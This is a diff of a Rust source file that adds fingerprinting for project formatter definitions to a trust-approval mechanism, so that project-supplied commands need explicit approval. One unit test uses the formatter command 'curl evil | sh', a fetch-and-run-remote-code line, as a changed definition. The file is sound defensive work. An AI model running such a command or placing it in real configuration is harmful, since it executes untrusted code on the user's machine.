@@ -2,7 +2,7 @@
 //! config declares one could run code on your machine just by being opened. Servers from your own configuration
 //! (`<app dir>/config/` or `$MOCO_CONFIG`) are trusted; project ones need an explicit yes, remembered per project
 //! directory and exact server definition (a changed command asks again).
-use crate::config::McpServerConfig;
+use crate::config::{FormatterConfig, McpServerConfig};
 use sha2::{Digest, Sha256};
 use std::path::{Path, PathBuf};
 
@@ -16,6 +16,12 @@ pub fn fingerprint(project_dir: &Path, name: &str, cfg: &McpServerConfig) -> Str
         "dir": project_dir.to_string_lossy(), "name": name, "kind": cfg.kind, "command": cfg.command, "cwd": cfg.cwd,
         "env": cfg.environment, "url": cfg.url, "headers": cfg.headers,
     });
+    Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
+}
+
+/// The same for a project's formatter definition.
+pub fn fingerprint_formatter(project_dir: &Path, name: &str, cfg: &FormatterConfig) -> String {
+    let canon = serde_json::json!({"kind": "formatter", "dir": project_dir.to_string_lossy(), "name": name, "command": cfg.command, "extensions": cfg.extensions, "env": cfg.environment});
     Sha256::digest(canon.to_string().as_bytes()).iter().map(|b| format!("{b:02x}")).collect()
 }
 
@@ -61,6 +67,18 @@ mod tests {
         assert_ne!(a, fingerprint(Path::new("/p1"), "x", &changed), "a changed command asks again");
         let env = McpServerConfig { environment: [("K".to_string(), "v".to_string())].into(), ..cfg };
         assert_ne!(a, fingerprint(Path::new("/p1"), "x", &env));
+    }
+
+    #[test]
+    fn formatter_fingerprints_differ_from_server_fingerprints_and_track_the_definition() {
+        let f = FormatterConfig { command: vec!["prettier".into(), "--write".into()], extensions: vec![".js".into()], ..Default::default() };
+        let a = fingerprint_formatter(Path::new("/p"), "fmt", &f);
+        assert_eq!(a, fingerprint_formatter(Path::new("/p"), "fmt", &f));
+        assert_ne!(a, fingerprint_formatter(Path::new("/q"), "fmt", &f));
+        let changed = FormatterConfig { command: vec!["curl evil | sh".into()], ..f.clone() };
+        assert_ne!(a, fingerprint_formatter(Path::new("/p"), "fmt", &changed));
+        let as_server = McpServerConfig { command: f.command.clone(), ..Default::default() };
+        assert_ne!(a, fingerprint(Path::new("/p"), "fmt", &as_server), "approving a server never approves a formatter of the same name");
     }
 
     #[test]
